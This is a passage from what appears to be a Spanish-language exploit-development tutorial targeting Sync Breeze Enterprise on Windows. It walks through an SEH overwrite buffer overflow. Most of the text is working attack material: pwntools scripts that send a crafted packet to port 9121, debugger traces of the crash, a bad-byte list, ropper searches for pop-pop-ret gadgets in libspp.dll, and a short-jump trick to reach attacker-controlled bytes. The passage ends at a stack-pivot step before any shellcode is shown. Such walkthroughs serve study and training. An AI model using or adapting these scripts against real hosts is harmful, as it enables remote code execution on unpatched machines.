header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">El programa corrompe y saltamos a la excepción que nos lleva al controlador.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
(1370.17b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0220ff48 ebx=00000000 ecx=41414141 edx=00000000 esi=0220ff0c edi=0220ff0c
eip=00cc166a esp=0220fe04 ebp=0220ff84 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_ConfigObj::Clear+0xa:
00cc166a 8b410c          mov     eax,dword ptr [ecx+0Ch] ds:002b:4141414d=????????

</span><span class="ro">0:000> </span><span class="p">g
(2448.1b84): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=77b04540 esi=00000000 edi=00000000
eip=43434343 esp=0220f848 ebp=0220f868 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
43434343 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que el puntero de <code class="language-plaintext highlighter-rouge">esp + 8</code> apunta a el siguiente SEH por lo que si saltamos los <code class="language-plaintext highlighter-rouge">8</code> bytes del siguiente SEH y controlador la dirección resultante deberia apuntar a lo que enviamos después que son los <code class="language-plaintext highlighter-rouge">badbytes</code>, si comparamos todos los bytes en esa dirección parece que ningún byte coincide por lo que probablemente el <code class="language-plaintext highlighter-rouge">0x00</code> es un badbyte y está corrompiendo todo lo que esta después, incluyendose a él mismo.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db poi(esp + 8) + 8
0220ff50  ff ff ff ff 4c 07 cf 00-00 3d cf 00 00 36 81 01  ....L....=...6..
0220ff60  62 3f cf 00 00 05 eb 00-00 36 81 01 14 3d cf 00  b?.......6...=..
0220ff70  00 05 eb 00 00 3d cf 00-49 5d ed 76 00 36 81 01  .....=..I].v.6..
0220ff80  30 5d ed 76 dc ff 20 02-db d6 ab 77 00 36 81 01  0].v.. ....w.6..
0220ff90  e8 ad c5 fa 00 00 00 00-00 00 00 00 00 36 81 01  .............6..
0220ffa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0220ffb0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0220ffc0  00 00 00 00 90 ff 20 02-00 00 00 00 e4 ff 20 02  ...... ....... .</span>
</code></pre></div></div><br>

<p class="plain-text">Lo que hacemos es crear un nuevo bytearray que omita el byte <code class="language-plaintext highlighter-rouge">0x00</code>, usando la propiedad <code class="language-plaintext highlighter-rouge">translate</code> podemos eliminar bytes específicos, ya que sabemos que nos traerá problemas quitamos el null byte de nuestro array dentro del exploit.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">badbytes </span><span class="o">= </span><span class="na">bytes</span><span class="p">(</span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 256</span><span class="p">)).translate(</span><span class="mi">None</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos el exploit y al comparar esa dirección con nuestros bytes omite <code class="language-plaintext highlighter-rouge">0x00</code> y el byte <code class="language-plaintext highlighter-rouge">0x01</code> no se ve afectado, sin embargo parece que <code class="language-plaintext highlighter-rouge">0x02</code> no se llega a escribir correctamente por lo que es probable que se pueda considear un <code class="language-plaintext highlighter-rouge">badbyte</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db poi(esp + 8) + 8
020bff50  01 00 00 00 4c 07 c4 00-00 3d c4 00 70 39 80 01  ....L....=..p9..
020bff60  62 3f c4 00 00 05 db 00-70 39 80 01 14 3d c4 00  b?......p9...=..
020bff70  00 05 db 00 00 3d c4 00-49 5d ed 76 70 39 80 01  .....=..I].vp9..
020bff80  30 5d ed 76 dc ff 0b 02-db d6 ab 77 70 39 80 01  0].v.......wp9..
020bff90  e1 3c fb c1 00 00 00 00-00 00 00 00 70 39 80 01  .<..........p9..
020bffa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
020bffb0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
020bffc0  00 00 00 00 90 ff 0b 02-00 00 00 00 e4 ff 0b 02  ................</span>
</code></pre></div></div><br>

<p class="plain-text">Este proceso puede ser algo repetitivo, ya que se debe hacer las veces que sean necesarias hasta eliminar todos los <code class="language-plaintext highlighter-rouge">badbytes</code> que pueden ocasionarnos problemas, en este caso al terminar este proceso nos quedamos con <code class="language-plaintext highlighter-rouge">6</code> badbytes y lo que buscamos es que el array de bytes que enviamos se muestre integro en la memoria indicando que ninguno de los bytes fue corrupto y podemos usarlos en el payload.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">badbytes </span><span class="o">= </span><span class="na">bytes</span><span class="p">(</span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 256</span><span class="p">)).translate(</span><span class="mi">None</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x0a\x0d\x25\x26\x2b\x3d</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db poi(esp + 8) + 8
020eff50  01 03 04 05 06 07 08 09-0b 0c 0e 0f 10 11 12 13  ................
020eff60  14 15 16 17 18 19 1a 1b-1c 1d 1e 1f 20 21 22 23  ............ !"#
020eff70  24 25 26 27 28 29 2a 2b-2c 2d 2e 2f 30 31 32 33  $%&'()*+,-./0123
020eff80  34 35 36 37 38 39 3a 3b-3c 3d 3e 3f 40 41 42 43  456789:;<=>?@ABC
020eff90  44 45 46 47 48 49 4a 4b-4c 4d 4e 4f 50 51 52 53  DEFGHIJKLMNOPQRS
020effa0  54 55 56 57 58 59 5a 5b-5c 5d 5e 5f 60 61 62 63  TUVWXYZ[\]^_`abc
020effb0  64 65 66 67 68 69 6a 6b-6c 6d 6e 6f 70 71 72 73  defghijklmnopqrs
020effc0  74 75 76 77 78 79 7a 7b-7c 7d 7e 7f 80 81 82 83  tuvwxyz{|}~.....</span>
</code></pre></div></div><br>

</section>

<section class="post" id="opcode">
<br><h3 class="post-title">Find Opcode</h3><br>

<p class="plain-text">Repasemos lo que tenemos, cuando ocurre una excepción en <code class="language-plaintext highlighter-rouge">esp + 8</code> se guarda el puntero al siguiente SEH por lo que si lo usamos como dirección de retorno se ejecutará el <code class="language-plaintext highlighter-rouge">0x42424242</code> como instrucción assembly que seria 4 veces <code class="language-plaintext highlighter-rouge">inc edx</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
01bff3fc: ntdll!ExecuteHandler2+44 (77af8ac0)
01bffe0c: libpal!md5_starts+149fb (0096d6eb)
01bfff44: 43434343
Invalid exception stack at 42424242

</span><span class="ro">0:000> </span><span class="p">dds esp L8
01bff3e8  77af8aa2 ntdll!ExecuteHandler2+0x26
01bff3ec  01bff4e8
01bff3f0  01bfff44
01bff3f4  01bff538
01bff3f8  01bff474
01bff3fc  01bffe0c
01bff400  77af8ac0 ntdll!ExecuteHandler2+0x44
01bff404  01bfff44</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces necesitamos quitar 8 bytes o 2 dwords del stack y ejecutar un <code class="language-plaintext highlighter-rouge">ret</code> para ejecutar el siguiente SEH como instrucción asm, esto podemos hacerlo con:</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">pop ???; pop ???; ret;</code>: Eliminará 4 bytes en el primer pop para guardarlo en el registro, 4 bytes en el segundo y al ejecutar el ret ejecutará el siguiente SEH.</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">add esp, 8; ret;</code>: Parecido al anterior solo que en lugar de guardar 2 dwords en registros hace que el puntero al stack aumenta en 8 bytes para ejecutar el ret.</p><br>

<p class="plain-text">Para encontrar un gadget que ejecute algunas de estas instrucciones primero necesitamos saber que <code class="language-plaintext highlighter-rouge">módulos</code> carga el programa que pertenezcan a él y no al sistema para esto podemos usar <code class="language-plaintext highlighter-rouge">lm</code>, solo hay <code class="language-plaintext highlighter-rouge">4</code> módulos y 3 de ellos son librerias, sin embargo de estos solo podemos usar <code class="language-plaintext highlighter-rouge">1</code> ya que el resto tiene como base una dirección que contiene <code class="language-plaintext highlighter-rouge">00</code> y antes habiamos visto que el null byte era un badbyte.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">lm f 
start    end        module name
00400000 00462000   syncbrs  C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe
00c20000 00cf4000   libpal   C:\Program Files (x86)\Sync Breeze Enterprise\bin\libpal.dll
00d00000 00db4000   libsync  C:\Program Files (x86)\Sync Breeze Enterprise\bin\libsync.dll
10000000 10223000   libspp   C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll
6f000000 6f0a7000   odbc32   C:\Windows\System32\odbc32.dll
722c0000 722eb000   sspiCli  C:\Windows\System32\sspicli.dll
............................................................
76cf0000 76df7000   crypt32  C:\Windows\System32\crypt32.dll
76f30000 770ef000   ntdll    C:\WINDOWS\System32\ntdll.dll</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos un módulo que no inicia con <code class="language-plaintext highlighter-rouge">00</code> y no tiene protecciones como <code class="language-plaintext highlighter-rouge">DEP</code>, <code class="language-plaintext highlighter-rouge">ASLR</code> u otros podemos usar <code class="language-plaintext highlighter-rouge">ropper</code> para encontrar gadgets que nos ayuden a saltar al siguiente <code class="language-plaintext highlighter-rouge">SEH</code>, encontramos varios gadgets y podemos usar cualquiera de ellos.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file libspp.dll --dllcharacteristics

DllCharacteristics
==================

Name                 Value
----                 -----
</span><span class="az">DynamicBase</span><span class="ve">          NO
</span><span class="az">ForceIntegrity</span><span class="ve">       NO
</span><span class="az">NxCompat</span><span class="ve">             NO
</span><span class="az">No Isolation</span><span class="ve">         NO
</span><span class="az">No SEH</span><span class="ve">               NO
</span><span class="az">No Bind</span><span class="ve">              NO
</span><span class="az">WdmDriver</span><span class="ve">            NO
</span><span class="az">ControlFLowGuard</span><span class="ve">     NO
</span><span class="az">TerminalServerAware</span><span class="ve">  NO

❯ ropper </span><span class="p">--file libspp.dll --badbytes</span><span class="am"> '00020a0df8fd'</span><span class="p"> --ppr

POP;POP;RET Instructions
========================

</span><span class="ro">0x10132edc</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> pop</span><span class="p"> edi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x1013251f</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x101241b2</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x1001bc5a</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ecx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x101582b0</span><span class="p">:</span><span class="am"> pop</span><span class="p"> eax</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x10125678</span><span class="p">:</span><span class="am"> pop</span><span class="p"> edi</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x10125274</span><span class="p">:</span><span class="am"> pop</span><span class="p"> edi</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x1001e6c5</span><span class="p">:</span><span class="am"> pop</span><span class="p"> edi</span><span class="az">;</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x101090a8</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x1001f561</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x10043ad7</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ecx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x10128eb9</span><span class="p">:</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> pop</span><span class="p"> edi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x1001f264</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">;</span><span class="am"> pop</span><span class="p"> ebx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x1012d597</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ebp</span><span class="az">;</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x1012b191</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 4</span><span class="az">;</span><span class="am"> pop</span><span class="p"> esi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;
</span><span class="ro">0x100129c8</span><span class="p">:</span><span class="am"> add</span><span class="p"> esp, 8</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span><span class="p">

16 gadgets found</span>
</code></pre></div></div><br>


<p class="plain-text">Nuestro exploit ahora tendrá como controlador el puntero a un <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code>, el gadget eliminará <code class="language-plaintext highlighter-rouge">8 bytes</code> del stack y luego retornará al puntero del siguiente SEH.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x10132edc</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(7cc.778): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01bff944 ebx=01bff9c4 ecx=00000139 edx=00000302 esi=01bffa0c edi=00000138
eip=008edcce esp=01bff998 ebp=01bffec8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_GetToken+0x4e:
008edcce 88042f          mov     byte ptr [edi+ebp],al      ds:002b:01c00000=??

</span><span class="ro">0:000> </span><span class="p">!exchain
01bffe0c: libpal!md5_starts+149fb (0095d6eb)
libspp!SPP_ValueTrend::FormatValueString+f6cc (10132edc)
Invalid exception stack at 42424242</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de que el programa corrompe podemos establecer un <code class="language-plaintext highlighter-rouge">breakpoint</code> en el gadget <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code>, podemos ver en <code class="language-plaintext highlighter-rouge">esp + 8</code> el puntero al siguiente SEH.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x10132edc

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000
eip=10132edc esp=01bff3e8 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
libspp!SPP_ValueTrend::FormatValueString+0xf6cc:
10132edc 5b              pop     ebx

</span><span class="ro">0:000> </span><span class="p">dds esp L4
01bff3e8  77af8aa2
01bff3ec  01bff4e8
01bff3f0  01bfff44
01bff3f4  01bff538</span>
</code></pre></div></div><br>

<p class="plain-text">El primer <code class="language-plaintext highlighter-rouge">pop</code> elimina 4 bytes del stack, el segundo <code class="language-plaintext highlighter-rouge">pop</code> otros 4 bytes y el <code class="language-plaintext highlighter-rouge">ret</code> ejecuta lo que esta en la dirección almacenada en esp que es el siguiente SEH que vale <code class="language-plaintext highlighter-rouge">0x42424242</code> o <code class="language-plaintext highlighter-rouge">BBBB</code> que su valor en asm es <code class="language-plaintext highlighter-rouge">inc edx</code> repetido por 4 veces.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=00000000 ebx=00000000 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000
eip=10132edc esp=01bff3e8 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
libspp!SPP_ValueTrend::FormatValueString+0xf6cc:
10132edc 5b              pop     ebx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000
eip=10132edd esp=01bff3ec ebp=01bff408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
libspp!SPP_ValueTrend::FormatValueString+0xf6cd:
10132edd 5f              pop     edi

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01bff4e8
eip=10132ede esp=01bff3f0 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
libspp!SPP_ValueTrend::FormatValueString+0xf6ce:
10132ede c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01bff4e8
eip=01bfff44 esp=01bff3f4 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
01bfff44 42              inc     edx</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos una forma de ejecutar código asm, sin embargo una vez que ejecute el <code class="language-plaintext highlighter-rouge">0x42424242</code> si intenta ejecutar la dirección del <code class="language-plaintext highlighter-rouge">controlador</code> como instrucción probablemente corrompa, la solución es saltar esos <code class="language-plaintext highlighter-rouge">8</code> bytes para llegar a las D's.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dds eip L8
01bfff44  42424242
01bfff48  10132edc
01bfff4c  44444444
01bfff50  44444444
01bfff54  44444444
01bfff58  44444444
01bfff5c  44444444
01bfff60  44444444</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora nuestro siguiente SEH toma como valor la instrucción <code class="language-plaintext highlighter-rouge">jmp $+8</code>, aunque esta solo pesa 2 bytes (<code class="language-plaintext highlighter-rouge">\xeb\x06</code>), necesitamos rellenar a 4 con A's para evitar problemas.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="p">asm(</span><span class="s">"jmp $+8"</span><span class="p">).ljust(</span><span class="mi">4</span><span class="p">, </span><span class="no">b</span><span class="s">"A"</span><span class="p">)
seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x10132edc</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos el exploit, ejecutamos el <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code> y la siguiente instrucción será el <code class="language-plaintext highlighter-rouge">jmp</code> corto que saltará a <code class="language-plaintext highlighter-rouge">0x01c0ff4c</code>, esta dirección es donde inician nuestras <code class="language-plaintext highlighter-rouge">D's</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x10132edc

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=10132edc edx=77af8ac0 esi=00000000 edi=00000000
eip=10132edc esp=01c0f3e8 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
libspp!SPP_ValueTrend::FormatValueString+0xf6cc:
10132edc 5b              pop     ebx

</span><span class="ro">0:000> </span><span class="p">pt
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c0f4e8
eip=10132ede esp=01c0f3f0 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
libspp!SPP_ValueTrend::FormatValueString+0xf6ce:
10132ede c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c0f4e8
eip=01c0ff44 esp=01c0f3f4 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
01c0ff44 eb06            jmp     01c0ff4c

</span><span class="ro">0:000> </span><span class="p">dds eip L4
01c0ff44  414106eb
01c0ff48  10132edc libspp!SPP_ValueTrend::FormatValueString+0xf6cc
01c0ff4c  44444444
01c0ff50  44444444</span>
</code></pre></div></div><br>

<p class="plain-text">Después del <code class="language-plaintext highlighter-rouge">jmp</code> corto lo siguiente que ejecutará son las <code class="language-plaintext highlighter-rouge">D's</code> como instrucción por lo que si en lugar de D's enviamos un <code class="language-plaintext highlighter-rouge">shellcode</code> deberiamos poder ejecutarlo.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c0f4e8
eip=01c0ff4c esp=01c0f3f4 ebp=01c0f408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
01c0ff4c 44              inc     esp

</span><span class="ro">0:000> </span><span class="p">dds eip L4
01c0ff4c  44444444
01c0ff50  44444444
01c0ff54  44444444
01c0ff58  44444444</span>
</code></pre></div></div><br>

</section>

<section class="post" id="pivot">
<br><h3 class="post-title">Stack Pivot</h3><br>

<p class="plain-text">Sin embargo no podemos solo enviar un shellcode ya que si miramos los bytes despues de escribir <code class="language-plaintext highlighter-rouge">180 D's</code> corta la cadena, este espacio no es suficiente para un <code class="language-plaintext highlighter-rouge">shellcode</code> por lo que necesitamos buscar una forma de obtener más espacio.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db eip L100
01c0ff4c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ff5c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ff6c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ff7c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ff8c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ff9c  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ffac  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ffbc  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ffcc  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ffdc  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0ffec  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c0fffc  44 44 44 44 ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  DDDD????????????
01c1000c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
01c1001c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
01c1002c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
01c1003c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span>
</code></pre></div></div><br>

<p class="plain-text">¿Porqué se corta la cadena? Esto ocurre debido a que el límite del stack es la dirección <code class="language-plaintext highlighter-rouge">0x01c0e000</code> por lo que no logra escribir mas allá de esa dirección.</p>
